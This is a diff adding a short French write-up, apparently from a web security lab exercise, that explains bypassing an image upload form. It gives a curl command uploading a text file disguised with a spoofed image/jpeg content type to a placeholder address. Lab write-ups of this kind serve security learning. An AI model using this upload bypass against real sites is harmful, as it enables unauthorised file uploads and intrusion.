@@ -1,0 +1,4 @@
+Sur la page home, cliquez sur 'ADD Image', on se trouve sur un formulaire d'upload qui attend un input de type file
+
+On va donc essayer avec curl d'envoyer une requete d'upload avec un autre fichier en le faisant passer pour une image.
+'curl -X POST -H 'Content-Type: multipart/form-data' -F 'Upload=send' -F 'uploaded=@desc.txt;type=image/jpeg' http://YOURADDRESSIP/index.php?page=upload#'
